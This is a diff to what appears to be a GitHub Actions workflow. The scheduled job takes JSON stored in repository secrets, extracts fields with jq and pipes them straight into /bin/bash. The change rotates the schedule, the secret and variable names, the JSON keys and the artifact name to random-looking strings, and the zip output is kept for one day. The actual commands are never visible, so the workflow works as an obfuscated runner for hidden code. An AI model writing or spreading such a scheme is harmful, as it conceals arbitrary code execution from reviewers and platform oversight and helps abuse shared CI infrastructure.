@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '49 0,6,12,18 * * *'
+    - cron: '10 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -17,20 +17,16 @@ jobs:
         uses: actions/checkout@v4
       - name: Execute
         env:
-          cy7: ${{ secrets.cy7 }}
+          iqrj14901: ${{ secrets.iqrj14901 }}
         run: |
-          printf '%s' "$cy7" | jq -r .y6 | /bin/bash
-          printf '%s' "$svtx70" | jq -r .osex07 | /bin/bash
-          echo $vm43 | jq -r .hghh119 | /bin/bash
-          printf '%s' "$dxynk170" | jq -r .tz13 | /bin/bash
-          echo $y69240 | jq -r .fei4 | /bin/bash
-          printf '%s' "$gru011" | jq -r .udwl1886 | /bin/bash
-          echo $lewtf799 | jq -r .ts84 | /bin/bash
+          printf '%s' "$iqrj14901" | jq -r .wgy9 | /bin/bash
+          echo $mhw2 | jq -r .g453 | /bin/bash
+          echo $gvhph26029 | jq -r .qt5 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: JpLkheXU
+          name: 3VxdGpHt
           path: "*.zip"
           retention-days: 1
